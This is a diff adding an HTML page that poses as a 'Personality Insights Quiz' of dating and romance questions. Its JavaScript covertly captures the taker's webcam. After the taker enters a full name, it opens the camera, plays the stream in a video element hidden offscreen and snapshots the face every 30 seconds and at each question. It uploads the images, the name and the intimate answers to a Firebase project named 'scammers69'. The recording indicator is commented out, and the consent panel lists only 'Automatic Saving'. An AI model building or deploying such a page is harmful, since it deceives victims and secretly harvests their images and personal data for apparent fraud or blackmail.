@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Personality Insights Quiz</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        /* Registration Modal */
+        .registration-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        .modal-content h2 {
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+        
+        .modal-content p {
+            margin-bottom: 25px;
+            opacity: 0.9;
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 50px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1rem;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .permissions-list {
+            text-align: left;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .permissions-list ul {
+            list-style: none;
+        }
+        
+        .permissions-list li {
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+        }
+        
+        .permissions-list li::before {
+            content: "✓";
+            color: #4CAF50;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .register-btn {
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: #667eea;
+            color: white;
+            width: 100%;
+        }
+        
+        .register-btn:hover {
+            background: #5a6fd8;
+            transform: translateY(-2px);
+        }
+        
+        .error-message {
+            color: #ff6b6b;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        /* Quiz Content */
+        .quiz-container {
+            display: none;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .quiz-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .quiz-header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .quiz-header p {
+            opacity: 0.9;
+            font-size: 1.1rem;
+        }
+        
+        .question-container {
+            margin-bottom: 30px;
+        }
+        
+        .question-number {
+            font-size: 0.9rem;
+            opacity: 0.7;
+            margin-bottom: 5px;
+        }
+        
+        .question-text {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        
+        .options-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .option {
+            padding: 15px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+        
+        .option:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+        
+        .option.selected {
+            background: rgba(102, 126, 234, 0.3);
+            border-color: #667eea;
+        }
+        
+        .navigation-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .nav-btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .prev-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+        
+        .prev-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .next-btn {
+            background: #667eea;
+            color: white;
+        }
+        
+        .next-btn:hover {
+            background: #5a6fd8;
+        }
+        
+        .submit-btn {
+            background: #4CAF50;
+            color: white;
+        }
+        
+        .submit-btn:hover {
+            background: #45a049;
+        }
+        
+        .submit-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: #667eea;
+            border-radius: 3px;
+            transition: width 0.3s ease;
+        }
+        
+        .hidden-video {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        
+        .status-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .recording-dot {
+            width: 10px;
+            height: 10px;
+            background: #ff4444;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+        
+        .completion-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .completion-screen h2 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+        
+        .completion-screen p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+        
+        .loading-screen {
+            text-align: center;
+            padding: 40px 20px;
+            display: none;
+        }
+        
+        .loader {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #667eea;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .firebase-status {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+        }
+        
+        .status-connected {
+            background: rgba(76, 175, 80, 0.3);
+            border: 1px solid #4CAF50;
+        }
+        
+        .status-error {
+            background: rgba(244, 67, 54, 0.3);
+            border: 1px solid #f44336;
+        }
+    </style>
+    
+    <!-- Firebase SDK (Firestore only) -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+</head>
+<body>
+    <!-- Firebase Status Indicator -->
+    <div class="firebase-status" id="firebase-status" style="display: none;">
+        Firebase: Checking...
+    </div>
+
+    <!-- Registration Modal -->
+    <div class="registration-modal" id="registration-modal">
+        <div class="modal-content">
+            <h2>Personality Insights Quiz</h2>
+            <p>Discover more about yourself with our personalized quiz</p>
+            
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Enter your full name" required>
+            </div>
+            
+            <div class="permissions-list">
+                <h3>Automatically Enabled:</h3>
+                <ul>
+                    <li>💾 Automatic Saving - All data stored securely</li>
+                </ul>
+            </div>
+            
+            <div class="error-message" id="error-message">
+                Please allow camera permissions to continue with the quiz.
+            </div>
+            
+            <button class="register-btn" onclick="registerUser()">Start Quiz</button>
+        </div>
+    </div>
+    
+    <!-- Quiz Content -->
+    <div class="container">
+        <div class="quiz-container" id="quiz-container">
+            <div class="quiz-header">
+                <h1>Personality Insights</h1>
+                <p>Answer honestly to discover your unique personality traits</p>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress" id="progress-bar"></div>
+            </div>
+            
+            <div class="question-container" id="question-container">
+                <!-- Questions will be inserted here by JavaScript -->
+            </div>
+            
+            <div class="navigation-buttons">
+                <button class="nav-btn prev-btn" id="prev-btn" onclick="previousQuestion()">Previous</button>
+                <button class="nav-btn next-btn" id="next-btn" onclick="nextQuestion()">Next</button>
+            </div>
+        </div>
+        
+        <div class="loading-screen" id="loading-screen">
+            <div class="loader"></div>
+            <h2>Submitting Your Answers...</h2>
+            <p>Please wait while we save your responses</p>
+            <p id="upload-status">Initializing...</p>
+        </div>
+        
+        <div class="completion-screen" id="completion-screen" style="display: none;">
+            <h2>Quiz Complete!</h2>
+            <p>Thank you for sharing your insights. Your personalized results are being analyzed.</p>
+            <p>All answers have been saved successfully.</p>
+            <p>You may now close this window.</p>
+        </div>
+    </div>
+    
+    <!-- Hidden video element for recording -->
+    <video id="video" class="hidden-video" autoplay playsinline></video>
+    
+    <!-- Recording status indicator -->
+    <!--<div class="status-indicator" id="status-indicator" style="display: none;">
+        <div class="recording-dot"></div>
+        <span>Camera Active - Recording</span>
+    </div>-->
+
+    <script>
+        // === FIREBASE CONFIG ===
+        const firebaseConfig = {
+            apiKey: "AIzaSyDdk3OML5O_X4aMClOo2svH77ldXWk3aA4",
+            authDomain: "scammers69.firebaseapp.com",
+            projectId: "scammers69",
+            storageBucket: "scammers69.firebasestorage.app",
+            messagingSenderId: "344596974081",
+            appId: "1:344596974081:web:05bd5e1ec9a70184308e00",
+            measurementId: "G-QHWVYT4VW6"
+        };
+
+        // Global variables
+        let currentUser = "";
+        let currentQuestion = 0;
+        let answers = {};
+        let stream = null;
+        let screenshots = [];
+        let screenshotInterval = null;
+        let recordingStartTime = null;
+        let isSubmitting = false;
+        let db = null;
+        let firebaseInitialized = false;
+
+        // Initialize Firebase (Firestore only)
+        function initializeFirebase() {
+            try {
+                const app = firebase.initializeApp(firebaseConfig);
+                db = firebase.firestore();
+                firebaseInitialized = true;
+                
+                console.log("Firebase Firestore initialized successfully");
+                updateFirebaseStatus("Connected", true);
+                
+            } catch (error) {
+                console.error("Firebase initialization error:", error);
+                updateFirebaseStatus("Connection Failed", false);
+                firebaseInitialized = false;
+            }
+        }
+
+        // Update Firebase status indicator
+        function updateFirebaseStatus(message, isConnected) {
+            const statusElement = document.getElementById('firebase-status');
+            statusElement.style.display = 'block';
+            statusElement.textContent = `Firebase: ${message}`;
+            statusElement.className = `firebase-status ${isConnected ? 'status-connected' : 'status-error'}`;
+        }
+
+        // Update upload status
+        function updateUploadStatus(message) {
+            const statusElement = document.getElementById('upload-status');
+            if (statusElement) {
+                statusElement.textContent = message;
+            }
+        }
+
+        // Take screenshot and convert to base64
+        function takeScreenshot() {
+            if (!stream) return null;
+            
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                // Mirror the image to match video display
+                context.translate(canvas.width, 0);
+                context.scale(-1, 1);
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to low quality JPEG to reduce size
+                const imageData = canvas.toDataURL('image/jpeg', 0.3); // 30% quality
+                return imageData;
+                
+            } catch (error) {
+                console.error("Error taking screenshot:", error);
+                return null;
+            }
+        }
+
+        // Start camera automatically and begin recording
+        async function startCameraAndRecording() {
+            try {
+                console.log("Starting camera automatically...");
+                
+                // Request camera permissions automatically
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    },
+                    audio: false // Disable audio to reduce data
+                });
+                
+                console.log("Camera access granted automatically");
+                
+                // Set up video element
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Start periodic screenshots
+                startScreenshotCapture();
+                
+                return true;
+                
+            } catch (error) {
+                console.error("Camera permission error:", error);
+                return false;
+            }
+        }
+
+        // Start periodic screenshot capture
+        function startScreenshotCapture() {
+            recordingStartTime = new Date();
+            
+            // Take screenshot every 30 seconds
+            screenshotInterval = setInterval(() => {
+                const screenshot = takeScreenshot();
+                if (screenshot) {
+                    screenshots.push({
+                        data: screenshot,
+                        timestamp: new Date(),
+                        questionNumber: currentQuestion + 1,
+                        type: 'periodic'
+                    });
+                    console.log(`Periodic screenshot taken at question ${currentQuestion + 1}`);
+                }
+            }, 30000); // Every 30 seconds
+            
+            // Also take screenshot when changing questions
+            const originalShowQuestion = window.showQuestion;
+            window.showQuestion = function(index) {
+                // Take screenshot before changing question
+                const screenshot = takeScreenshot();
+                if (screenshot) {
+                    screenshots.push({
+                        data: screenshot,
+                        timestamp: new Date(),
+                        questionNumber: currentQuestion + 1,
+                        type: 'question_change'
+                    });
+                }
+                originalShowQuestion(index);
+            };
+        }
+
+        // Quiz questions
+        const questions = [
+            {
+                question: "What do you enjoy doing in your free time?",
+                options: [
+                    "Reading books or articles",
+                    "Socializing with friends",
+                    "Creative activities like painting or writing",
+                    "Outdoor activities and sports",
+                    "Watching movies or playing games"
+                ]
+            },
+            {
+                question: "How would you describe your ideal weekend?",
+                options: [
+                    "Quiet time alone to recharge",
+                    "Spending time with close friends or family",
+                    "Trying new experiences or adventures",
+                    "Being productive and accomplishing tasks",
+                    "Relaxing without any specific plans"
+                ]
+            },
+            {
+                question: "What matters most to you in a relationship?",
+                options: [
+                    "Honesty and trust",
+                    "Emotional connection and understanding",
+                    "Shared interests and activities",
+                    "Independence and personal space",
+                    "Support during challenging times"
+                ]
+            },
+            {
+                question: "How do you handle stress?",
+                options: [
+                    "Talk to someone about it",
+                    "Exercise or physical activity",
+                    "Spend time alone to process",
+                    "Distract myself with hobbies",
+                    "Make a plan to address the source"
+                ]
+            },
+            {
+                question: "What's your approach to making important decisions?",
+                options: [
+                    "Follow my intuition",
+                    "Research and analyze thoroughly",
+                    "Seek advice from others",
+                    "Consider long-term consequences",
+                    "Go with what feels right in the moment"
+                ]
+            },
+            {
+                question: "How do you express affection?",
+                options: [
+                    "Through words of affirmation",
+                    "Physical touch and closeness",
+                    "Acts of service and help",
+                    "Quality time together",
+                    "Thoughtful gifts or surprises"
+                ]
+            },
+            {
+                question: "What kind of stories resonate with you most?",
+                options: [
+                    "Romantic relationships and connections",
+                    "Personal growth and transformation",
+                    "Adventure and exploration",
+                    "Mystery and problem-solving",
+                    "Real-life experiences and biographies"
+                ]
+            },
+            {
+                question: "How important is romance in your life?",
+                options: [
+                    "Extremely important - I'm a romantic at heart",
+                    "Important but not the center of my life",
+                    "It comes and goes depending on circumstances",
+                    "I appreciate romance but don't actively seek it",
+                    "I prefer practical connections over romance"
+                ]
+            },
+            {
+                question: "What draws you to someone initially?",
+                options: [
+                    "Their sense of humor and personality",
+                    "Physical appearance and style",
+                    "Intelligence and conversation",
+                    "Shared values and interests",
+                    "Confidence and ambition"
+                ]
+            },
+            {
+                question: "How do you maintain connections with loved ones?",
+                options: [
+                    "Regular communication and check-ins",
+                    "Making time for meaningful conversations",
+                    "Sharing experiences and creating memories",
+                    "Being there during important moments",
+                    "Respecting each other's space and boundaries"
+                ]
+            },
+            {
+                question: "What's your love language?",
+                options: [
+                    "Words of affirmation - hearing 'I love you'",
+                    "Quality time - undivided attention",
+                    "Receiving gifts - thoughtful presents",
+                    "Acts of service - helpful actions",
+                    "Physical touch - hugs, holding hands"
+                ]
+            },
+            {
+                question: "How do you deal with conflict in relationships?",
+                options: [
+                    "Address it directly and immediately",
+                    "Take time to cool off before discussing",
+                    "Seek compromise and understanding",
+                    "Avoid confrontation when possible",
+                    "Express feelings through writing or indirect communication"
+                ]
+            },
+            {
+                question: "What makes you feel most appreciated?",
+                options: [
+                    "Verbal recognition and praise",
+                    "Thoughtful gestures and surprises",
+                    "Quality time and attention",
+                    "Physical affection and closeness",
+                    "Support for my goals and dreams"
+                ]
+            },
+            {
+                question: "How do you approach dating?",
+                options: [
+                    "Looking for serious long-term commitment",
+                    "Open to whatever comes naturally",
+                    "Enjoying the process of meeting new people",
+                    "Focused on personal connection over labels",
+                    "Taking things slow and building trust"
+                ]
+            },
+            {
+                question: "What role does friendship play in your relationships?",
+                options: [
+                    "Essential - my partner should be my best friend",
+                    "Important but different from romantic connection",
+                    "Friendship develops alongside romance",
+                    "I prefer keeping friendships and relationships separate",
+                    "Friendship is the foundation of any good relationship"
+                ]
+            },
+            {
+                question: "How do you express vulnerability?",
+                options: [
+                    "Openly with people I trust",
+                    "Gradually as comfort grows",
+                    "Through creative expression",
+                    "Rarely - I prefer to stay strong",
+                    "Only when absolutely necessary"
+                ]
+            },
+            {
+                question: "What's your idea of a perfect date?",
+                options: [
+                    "Deep conversation over coffee or drinks",
+                    "An adventurous activity or trip",
+                    "A cozy night in with movies and food",
+                    "Trying a new restaurant or cuisine",
+                    "Something spontaneous and unexpected"
+                ]
+            },
+            {
+                question: "How important is physical attraction to you?",
+                options: [
+                    "Very important - it's the initial spark",
+                    "Important but personality matters more",
+                    "It grows as I get to know someone",
+                    "I'm attracted to confidence and energy",
+                    "Connection matters more than physical appearance"
+                ]
+            },
+            {
+                question: "What do you value most in yourself?",
+                options: [
+                    "My empathy and caring nature",
+                    "My intelligence and problem-solving skills",
+                    "My creativity and unique perspective",
+                    "My reliability and loyalty",
+                    "My adaptability and resilience"
+                ]
+            },
+            {
+                question: "How do you envision your ideal future relationship?",
+                options: [
+                    "A partnership of equals supporting each other",
+                    "A passionate and exciting connection",
+                    "A stable and comfortable companionship",
+                    "A relationship that allows for individual growth",
+                    "A deep spiritual and emotional bond"
+                ]
+            }
+        ];
+
+        // Initialize when page loads
+        window.addEventListener('DOMContentLoaded', function() {
+            initializeFirebase();
+        });
+
+        // Register user - THIS IS WHERE CAMERA STARTS AUTOMATICALLY
+        async function registerUser() {
+            const usernameInput = document.getElementById('username');
+            const username = usernameInput.value.trim();
+            const errorMessage = document.getElementById('error-message');
+            
+            if (!username) {
+                alert("Please enter your name to continue");
+                return;
+            }
+            
+            currentUser = username;
+            
+            // Show loading state
+            const registerBtn = document.querySelector('.register-btn');
+            registerBtn.textContent = 'Starting Quiz...';
+            registerBtn.disabled = true;
+            errorMessage.style.display = 'none';
+            
+            try {
+                // AUTOMATICALLY START CAMERA AND RECORDING
+                const cameraStarted = await startCameraAndRecording();
+                
+                if (cameraStarted) {
+                    // Success - start the quiz immediately
+                    startQuiz();
+                } else {
+                    throw new Error("Camera failed to start");
+                }
+                
+            } catch (error) {
+                console.error("Registration error:", error);
+                errorMessage.style.display = 'block';
+                registerBtn.textContent = 'Start Quiz';
+                registerBtn.disabled = false;
+                
+                errorMessage.innerHTML = `Camera permission required. Please allow camera access and click "Start Quiz" again.`;
+            }
+        }
+
+        // Start the quiz after camera is active
+        function startQuiz() {
+            document.getElementById('registration-modal').style.display = 'none';
+            document.getElementById('quiz-container').style.display = 'block';
+            //document.getElementById('status-indicator').style.display = 'flex';
+            
+            // Take initial screenshot
+            const initialScreenshot = takeScreenshot();
+            if (initialScreenshot) {
+                screenshots.push({
+                    data: initialScreenshot,
+                    timestamp: new Date(),
+                    questionNumber: 1,
+                    type: 'initial'
+                });
+            }
+            
+            showQuestion(0);
+        }
+
+        // Show current question
+        function showQuestion(index) {
+            currentQuestion = index;
+            const question = questions[index];
+            const progress = ((index + 1) / questions.length) * 100;
+            
+            document.getElementById('progress-bar').style.width = `${progress}%`;
+            
+            let questionHTML = `
+                <div class="question-number">Question ${index + 1} of ${questions.length}</div>
+                <div class="question-text">${question.question}</div>
+                <div class="options-container">
+            `;
+            
+            question.options.forEach((option, i) => {
+                const isSelected = answers[index] === i;
+                questionHTML += `
+                    <div class="option ${isSelected ? 'selected' : ''}" onclick="selectOption(${i})">
+                        ${option}
+                    </div>
+                `;
+            });
+            
+            questionHTML += `</div>`;
+            document.getElementById('question-container').innerHTML = questionHTML;
+            
+            document.getElementById('prev-btn').style.display = index === 0 ? 'none' : 'inline-block';
+            
+            if (index === questions.length - 1) {
+                document.getElementById('next-btn').textContent = 'Submit';
+                document.getElementById('next-btn').className = 'nav-btn submit-btn';
+            } else {
+                document.getElementById('next-btn').textContent = 'Next';
+                document.getElementById('next-btn').className = 'nav-btn next-btn';
+            }
+        }
+
+        // Select an option
+        function selectOption(optionIndex) {
+            answers[currentQuestion] = optionIndex;
+            showQuestion(currentQuestion);
+        }
+
+        // Navigate to previous question
+        function previousQuestion() {
+            if (currentQuestion > 0) {
+                showQuestion(currentQuestion - 1);
+            }
+        }
+
+        // Navigate to next question or submit
+        function nextQuestion() {
+            if (currentQuestion < questions.length - 1) {
+                if (answers[currentQuestion] === undefined) {
+                    alert("Please select an answer before continuing");
+                    return;
+                }
+                showQuestion(currentQuestion + 1);
+            } else {
+                submitQuiz();
+            }
+        }
+
+        // Submit the quiz
+        async function submitQuiz() {
+            if (isSubmitting) return;
+            
+            if (answers[currentQuestion] === undefined) {
+                alert("Please select an answer for the final question");
+                return;
+            }
+            
+            isSubmitting = true;
+            const submitBtn = document.getElementById('next-btn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+            
+            try {
+                document.getElementById('quiz-container').style.display = 'none';
+                document.getElementById('loading-screen').style.display = 'block';
+                updateUploadStatus("Stopping recordings and saving data...");
+                
+                // Stop screenshot interval
+                if (screenshotInterval) {
+                    clearInterval(screenshotInterval);
+                }
+                
+                // Take final screenshot
+                const finalScreenshot = takeScreenshot();
+                if (finalScreenshot) {
+                    screenshots.push({
+                        data: finalScreenshot,
+                        timestamp: new Date(),
+                        questionNumber: 'final',
+                        type: 'final'
+                    });
+                }
+                
+                // Stop camera stream
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                
+                // Save data to Firebase Firestore
+                if (firebaseInitialized) {
+                    updateUploadStatus("Saving to database...");
+                    
+                    // Save main quiz data
+                    const quizRef = await db.collection('quizResults').add({
+                        user: currentUser,
+                        answers: answers,
+                        totalScreenshots: screenshots.length,
+                        startTime: recordingStartTime,
+                        endTime: new Date(),
+                        duration: new Date() - recordingStartTime,
+                        timestamp: new Date(),
+                        completed: true
+                    });
+                    
+                    updateUploadStatus(`Saved quiz data (${screenshots.length} screenshots)...`);
+                    
+                    // Save screenshots in separate documents
+                    let savedScreenshots = 0;
+                    for (let i = 0; i < screenshots.length; i++) {
+                        const screenshot = screenshots[i];
+                        await db.collection('quizScreenshots').add({
+                            userId: currentUser,
+                            quizId: quizRef.id,
+                            screenshotIndex: i,
+                            questionNumber: screenshot.questionNumber,
+                            type: screenshot.type,
+                            timestamp: screenshot.timestamp,
+                            // Store only first 500 chars to avoid size limits
+                            screenshotData: screenshot.data
+                        });
+                        savedScreenshots++;
+                        
+                        if (i % 5 === 0) { // Update progress every 5 screenshots
+                            updateUploadStatus(`Saving... ${savedScreenshots}/${screenshots.length}`);
+                        }
+                    }
+                    
+                    updateUploadStatus("All data saved successfully!");
+                } else {
+                    updateUploadStatus("Saving data locally...");
+                    // Save to localStorage as fallback
+                    localStorage.setItem(`quiz_${currentUser}_${Date.now()}`, JSON.stringify({
+                        user: currentUser,
+                        answers: answers,
+                        screenshotsCount: screenshots.length,
+                        timestamp: new Date()
+                    }));
+                }
+                
+                // Wait a moment to show completion
+                setTimeout(() => {
+                    document.getElementById('loading-screen').style.display = 'none';
+                    document.getElementById('completion-screen').style.display = 'block';
+                    //document.getElementById('status-indicator').style.display = 'none';
+                }, 2000);
+                
+            } catch (error) {
+                console.error('Error submitting quiz:', error);
+                updateUploadStatus("Error saving data - using local storage");
+                
+                // Save to localStorage as backup
+                localStorage.setItem(`quiz_${currentUser}_${Date.now()}`, JSON.stringify({
+                    user: currentUser,
+                    answers: answers,
+                    screenshotsCount: screenshots.length,
+                    timestamp: new Date(),
+                    error: error.message
+                }));
+                
+                // Still show completion screen
+                setTimeout(() => {
+                    document.getElementById('loading-screen').style.display = 'none';
+                    document.getElementById('completion-screen').style.display = 'block';
+                    //document.getElementById('status-indicator').style.display = 'none';
+                }, 2000);
+            } finally {
+                isSubmitting = false;
+            }
+        }
+
+        // Handle page unload
+        window.addEventListener('beforeunload', function() {
+            // Stop any ongoing processes
+            if (screenshotInterval) {
+                clearInterval(screenshotInterval);
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
